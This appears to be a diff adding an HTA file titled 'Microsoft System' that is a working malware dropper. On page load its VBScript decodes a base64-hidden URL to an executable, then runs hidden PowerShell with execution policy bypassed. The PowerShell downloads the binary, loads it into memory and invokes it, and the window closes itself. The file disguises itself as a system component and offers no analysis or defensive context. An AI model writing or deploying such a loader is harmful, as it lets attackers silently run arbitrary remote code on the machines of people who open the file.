@@ -1,0 +1,28 @@
+<html>
+<head>
+<title>Microsoft System</title>
+<HTA:APPLICATION ID="FinalStealth" WINDOWSTATE="minimize" SHOWINTASKBAR="no" BORDER="none" CAPTION="no" SYSMENU="no">
+</head>
+<body>
+<script language="VBScript">
+    Sub Window_OnLoad
+        On Error Resume Next
+        Set shell = CreateObject("WScript.Shell")
+        
+        base64Url = "aHR0cHM6Ly9naXRodWIuY29tL2N1Y2l1dS9JbmplY3RvckNvcmUvcmF3L3JlZnMvaGVhZHMvbWFpbi9iYWRjb25jZXB0LmV4ZQ=="
+        
+        ' Optimized PowerShell command
+        psCommand = "$b='" & base64Url & "';"
+        psCommand = psCommand & "$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b));"
+        psCommand = psCommand & "$d=(New-Object Net.WebClient).DownloadData($u);"
+        psCommand = psCommand & "$a=[Reflection.Assembly]::Load($d);"
+        psCommand = psCommand & "$n=[String[]]::new(0);"
+        psCommand = psCommand & "$a.EntryPoint.Invoke($null,@(,$n))"
+        
+        ' Execute hidden
+        shell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psCommand & """", 0, False
+        Window.Close
+    End Sub
+</script>
+</body>
+</html>
